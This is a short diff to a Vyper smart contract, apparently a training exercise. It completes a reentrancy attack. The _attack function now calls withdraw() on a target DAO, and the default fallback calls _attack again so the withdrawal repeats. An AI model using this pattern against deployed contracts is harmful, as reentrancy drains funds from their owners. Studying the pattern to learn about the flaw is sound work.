@@ -15,7 +15,7 @@ def __init__():
 def _attack() -> bool:
     assert self.dao_address != ZERO_ADDRESS
     
-    DAO(self.dao_address).deposit(value = self.balance)
+    DAO(self.dao_address).withdraw()
         
 
     return True
@@ -45,7 +45,7 @@ def __default__():
     flag: bool = True
     # TODO: Add code here to complete the recursive call
     if (flag):
-        flag = False
-        self._attack()
+        flag = self._attack()
+        
     
     pass
